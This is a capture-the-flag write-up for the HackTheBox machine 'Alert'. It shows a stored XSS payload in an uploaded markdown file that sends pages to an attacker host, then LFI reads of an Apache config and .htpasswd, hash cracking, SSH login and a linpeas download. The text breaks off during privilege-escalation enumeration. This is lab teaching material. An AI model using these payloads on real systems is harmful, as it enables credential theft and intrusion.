@@ -1,0 +1,400 @@
+---
+title: "HTB: Alert"
+date: 2024-12-02
+description: "Alert is a box that consist of exploiting cross-site scripting and file permission to fully take over the machine."
+keywords: ["HTB", "HackTheBox", "Alert"]
+draft: false
+---
+
+## Initial Foothold
+
+Let's start running a nmap scan on the machine to search for open ports. 
+
+```text title="Nmap Result"
+~/HTB/Alert ❯ nmap --min-rate 100000 -sV -sC 10.129.199.31 -o nmap.result
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-01 12:05 CET
+Nmap scan report for alert.htb (10.129.199.31)
+Host is up (0.11s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
+|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
+|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Alert - Markdown Viewer
+|_Requested resource was index.php?page=alert
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.38 seconds
+```
+
+The ports `22` and `80` indicates that the machine requires us to exploit the web application for the initial foothold. We will need to add `alert.htb` on our `/etc/hosts` file to access the web application.
+
+```text title="/etc/hosts"
+##
+# Host Database
+#
+# localhost is used to configure the loopback interface
+# when the system is booting.  Do not change this entry.
+##
+127.0.0.1	localhost
+255.255.255.255	broadcasthost
+::1             localhost
+10.129.199.31	alert.htb
+```
+
+The web application allows us to upload markdown files and it will display these markdown files to us inside the web application. The web application also allows us to contact the logged-on user through contact us page. Here's a overview of the pages:
+
+**Main Page:**
+
+<img src="/assets/images/htb-alert/htb-alert-1.png" />
+
+**Contact Us Page:**
+
+<img src="/assets/images/htb-alert/htb-alert-2.png" />
+
+
+A way to exploit the web application is to add JavaScript code to our markdown file and upload it to the web application to see if it will execute our JavaScript code. Here's a overview of the markdown file:
+
+
+```markdown title="Markdown File"
+# Introduction
+
+<script>
+fetch("http://alert.htb/index.php?page=alert").then(response => response.text()).then(data => fetch("http://10.10.16.9/steal.php?content=" + btoa(data)));
+</script>
+
+# Main
+
+Test #2
+
+# Conclusion
+
+Test #3
+```
+
+What does the JavaScript code do? All the code does is fetching the `http://alert.htb/index.php` and sending that data over to our machine and we can capture the data by running netcat. Once our markdown file is uploaded to the web application a URL is returned to us inside the HTML code and we can try to visit the URL to see if our JavaScript code is executed.
+
+<img src="/assets/images/htb-alert/htb-alert-3.png" className="rounded-lg"/>
+
+When I visited the URL, I received data on netcat listener which indicates that the web application is vulnerable for cross-site scripting. Let's try sending the URL on contact us page and see if we can obtain anything interesting from the logged-on user.
+
+<img src="/assets/images/htb-alert/htb-alert-4.png" />
+
+The JavaScript code was successfully executed on the logged-on user client and the HTML code that was returned to us contains a interesting page called for messsages. 
+
+```text {26}
+~/HTB/Alert ❯ nc -l 80
+GET /steal.php?content=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWFya2Rvd24gVmlld2VyPC9oMT48ZGl2IGNsYXNzPSJmb3JtLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0idmlzdWFsaXplci5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgYWNjZXB0PSIubWQiIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlZpZXcgTWFya2Rvd24iPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4gICAgPC9kaXY+CiAgICA8Zm9vdGVyPgogICAgICAgIDxwIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij6pIDIwMjQgQWxlcnQuIEFsbCByaWdodHMgcmVzZXJ2ZWQuPC9wPgogICAgPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgoK HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+
+~/HTB/Alert ❯ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWFya2Rvd24gVmlld2VyPC9oMT48ZGl2IGNsYXNzPSJmb3JtLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0idmlzdWFsaXplci5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgYWNjZXB0PSIubWQiIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlZpZXcgTWFya2Rvd24iPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICA8L2Rpdj4gICAgPC9kaXY+CiAgICA8Zm9vdGVyPgogICAgICAgIDxwIHN0eWxlPSJjb2xvcjogYmxhY2s7Ij6pIDIwMjQgQWxlcnQuIEFsbCByaWdodHMgcmVzZXJ2ZWQuPC9wPgogICAgPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgoK" | base64 -d
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Alert - Markdown Viewer</title>
+</head>
+<body>
+    <nav>
+        <a href="index.php?page=alert">Markdown Viewer</a>
+        <a href="index.php?page=contact">Contact Us</a>
+        <a href="index.php?page=about">About Us</a>
+        <a href="index.php?page=donate">Donate</a>
+        <a href="index.php?page=messages">Messages</a>    </nav>
+    <div class="container">
+        <h1>Markdown Viewer</h1><div class="form-container">
+            <form action="visualizer.php" method="post" enctype="multipart/form-data">
+                <input type="file" name="file" accept=".md" required>
+                <input type="submit" value="View Markdown">
+            </form>
+          </div>    </div>
+    <footer>
+        <p style="color: black;">� 2024 Alert. All rights reserved.</p>
+    </footer>
+</body>
+</html>
+```
+
+We can modify the JavaScript code to read the `/index.php?page=messages` and see if anything interesting is inside the message page. Here's a overview of the JavaScript code:
+
+<img src="/assets/images/htb-alert/htb-alert-5.png" className="rounded-lg"/>
+
+When the new payload is uploaded, we can send the new URL to the logged-on user through the contact us page and that will return the following request to us.
+
+```
+~/HTB/Alert ❯ nc -l 80
+GET /steal.php?content=PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg== HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+
+~/HTB/Alert ❯ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgogICAgPHRpdGxlPkFsZXJ0IC0gTWFya2Rvd24gVmlld2VyPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxuYXY+CiAgICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9YWxlcnQiPk1hcmtkb3duIFZpZXdlcjwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0IFVzPC9hPgogICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1kb25hdGUiPkRvbmF0ZTwvYT4KICAgICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1tZXNzYWdlcyI+TWVzc2FnZXM8L2E+ICAgIDwvbmF2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8aDE+TWVzc2FnZXM8L2gxPjx1bD48bGk+PGEgaHJlZj0nbWVzc2FnZXMucGhwP2ZpbGU9MjAyNC0wMy0xMF8xNS00OC0zNC50eHQnPjIwMjQtMDMtMTBfMTUtNDgtMzQudHh0PC9hPjwvbGk+PC91bD4KICAgIDwvZGl2PgogICAgPGZvb3Rlcj4KICAgICAgICA8cCBzdHlsZT0iY29sb3I6IGJsYWNrOyI+qSAyMDI0IEFsZXJ0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4KICAgIDwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg==" | base64 -d
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <title>Alert - Markdown Viewer</title>
+</head>
+<body>
+    <nav>
+        <a href="index.php?page=alert">Markdown Viewer</a>
+        <a href="index.php?page=contact">Contact Us</a>
+        <a href="index.php?page=about">About Us</a>
+        <a href="index.php?page=donate">Donate</a>
+        <a href="index.php?page=messages">Messages</a>    </nav>
+    <div class="container">
+        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
+    </div>
+    <footer>
+        <p style="color: black;">� 2024 Alert. All rights reserved.</p>
+    </footer>
+</body>
+</html>
+```
+
+The `message.php` file has a `file` parameter which indicates that the `file` parameter is used to read files. Let's modify our JavaScript code to read the `2024-03-10_15-48-34.txt` file.
+
+<img src="/assets/images/htb-alert/htb-alert-6.png" className="rounded-lg" />
+
+Again once the new URL is generated it needs to be sent through contact us page and we will need to wait for logged-on user to click on it.
+
+```
+~/HTB/Alert ❯ nc -l 80
+GET /steal.php?content=PHByZT48L3ByZT4K HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+
+~/HTB/Alert ❯ echo "PHByZT48L3ByZT4K" | base64 -d                                                                       8s
+<pre></pre>
+```
+
+Unfortunately the text file does not contain any information inside it. However, the `file` parameter might be vulnerable for Local File Inclusion (LFI) and we can check this by trying to read the `000-default.conf` file.
+
+<img src="/assets/images/htb-alert/htb-alert-7.png" className="rounded-lg"/>
+
+We successfully managed to read the file which means the `file` parameter is vulnerable for Local File Inclusion (LFI). Here's a overview of the content inside `000-default.conf`.
+
+```text
+~/HTB/Alert ❯ nc -l 80                                                                                                  7s
+GET /steal.php?content=PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg== HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+
+~/HTB/Alert ❯ echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg==" | base64 -d
+<pre><VirtualHost *:80>
+    ServerName alert.htb
+
+    DocumentRoot /var/www/alert.htb
+
+    <Directory /var/www/alert.htb>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    </Directory>
+
+    RewriteEngine On
+    RewriteCond %{HTTP_HOST} !^alert\.htb$
+    RewriteCond %{HTTP_HOST} !^$
+    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+<VirtualHost *:80>
+    ServerName statistics.alert.htb
+
+    DocumentRoot /var/www/statistics.alert.htb
+
+    <Directory /var/www/statistics.alert.htb>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    </Directory>
+
+    <Directory /var/www/statistics.alert.htb>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        AuthType Basic
+        AuthName "Restricted Area"
+        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+        Require valid-user
+    </Directory>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+</pre>
+```
+
+The `default-000.conf` file contains interesting information about a `.htpasswd` file which is located at `/var/www/statistics.alert.htb`. Let's try to modify the JavaScript file to read the `.htpasswd` file.
+
+<img src="/assets/images/htb-alert/htb-alert-7.png" className="rounded-lg"/>
+
+
+We successfully managed to read the `/var/www/statistics.alert.htb/.htpasswd` file without any issues. Now let's read the content inside the `.htpasswd` file.
+
+```text
+~/HTB/Alert ❯ nc -l 80
+GET /steal.php?content=PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K HTTP/1.1
+Host: 10.10.16.9
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+
+~/HTB/Alert ❯ echo "PHByZT5hbGJlcnQ6JGFwcjEkYk1vUkJKT2ckaWdHOFdCdFExeFlEVFFkTGpTV1pRLwo8L3ByZT4K" | base64 -d          12s
+<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+</pre>
+```
+
+Success! We managed to obtain a username and password hash which we can potentially crack and login to the server using the SSH protocol. We can crack the password hash using Hashcat with the following command. 
+
+```text
+~/HTB/Alert ❯ hashcat -m 1600 -a 0 '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' rockyou.txt
+...
+$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
+...
+```
+
+Hashcat successfully cracked the password and now we can try to login as albert using SSH protocol.
+
+```
+~/HTB/Alert ❯ ssh albert@alert.HTB
+...
+albert@alert:~$ whoami
+albert
+albert@alert:~$ hostname
+alert
+albert@alert:~$ pwd
+/home/albert
+albert@alert:~$ cat /home/albert/user.txt
+7d9099094f9d0a8ce2764a66d612a7dc
+...
+```
+
+We successfully managed to login as albert and read the `user.txt` flag. A advice to beginners; I always recommend reading the `user.txt` flag with the full path.
+
+## Privilege Escalation
+
+Now as we managed to login as albert, it's time to transfer `linpeas.sh` over to the machine and see if there are any vulnerabilities we can exploit to elevate our privileges. 
+
+```text
+albert@alert:~$ wget http://10.10.16.9/linpeas.sh
+--2024-12-01 13:58:05--  http://10.10.16.9/linpeas.sh
+Connecting to 10.10.16.9:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 827841 (808K) [application/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                     100%[===================================================>] 808.44K  2.27MB/s    in 0.3s
+
+2024-12-01 13:58:06 (2.27 MB/s) - ‘linpeas.sh’ saved [827841/827841]
+
+albert@alert:~$ chmod +x linpeas.sh
+albert@alert:~$ ./linpeas.sh
+...
+root         755  0.0  0.1  17360  7632 ?        Ss   10:34   0:00 /lib/systemd/systemd-logind
+root         756  0.0  0.2 393268 11924 ?        Ssl  10:34   0:00 /usr/lib/udisks2/udisksd
+root         794  0.0  0.2 315112 11836 ?        Ssl  10:34   0:00 /usr/sbin/ModemManager
+systemd+     930  0.0  0.3  24972 13420 ?        Ss   10:34   0:01 /lib/systemd/systemd-resolved
+root         979  0.0  0.0   6816  2940 ?        Ss   10:34   0:00 /usr/sbin/cron -f
+root         989  0.0  0.0   8356  3356 ?        S    10:34   0:00  _ /usr/sbin/CRON -f
+root        1009  0.0  0.0   2608   532 ?        Ss   10:34   0:00  |   _ /bin/sh -c /root/scripts/php_bot.sh
+root        1011  0.0  0.0   6892  3212 ?        S    10:34   0:00  |       _ /bin/bash /root/scripts/php_bot.sh
+root        1019  0.0  0.0   2636   796 ?        S    10:34   0:00  |           _ inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
+root        1020  0.0  0.0   6892   232 ?        S    10:34   0:00  |           _ /bin/bash /root/scripts/php_bot.sh
+root         990  0.0  0.0   8356  3356 ?        S    10:34   0:00  _ /usr/sbin/CRON -f
+root        1010  0.0  0.0   2608   592 ?        Ss   10:34   0:00      _ /bin/sh -c /root/scripts/xss_bot.sh
+root        1012  0.0  0.0   6892  3308 ?        S    10:34   0:00          _ /bin/bash /root/scripts/xss_bot.sh
+root        1017  0.0  0.0   2636   800 ?        S    10:34   0:00              _ inotifywait -m -e create --format %w%f %e /var/www/alert.htb/messages --exclude 2024-03-10_15-48-34.txt
+root        1018  0.0  0.0   6892  2012 ?        S    10:34   0:00              _ /bin/bash /root/scripts/xss_bot.sh
+root         987  0.0  0.6 206768 24300 ?        Ss   10:34   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
+root         993  0.0  0.5 396348 20836 ?        Ssl  10:34   0:05 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
+...
+```
+
+The `/opt/website-monitor` is an interesting application as it doesn't come defaulty with Linux. Let's check out the `website-monitor` application.
+
+```
+albert@alert:/opt/website-monitor$ ls -la
+total 96
+drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
+drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
+drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
+drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
+-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
+-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
+-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
+drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
+-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
+-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
+-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
+-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
+drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
+albert@alert:/opt/website-monitor$ cat index.php
+<?php
+
+include('config/configuration.php');
+include(PATH.'/Parsedown.php');
+...
+?>
+```
+
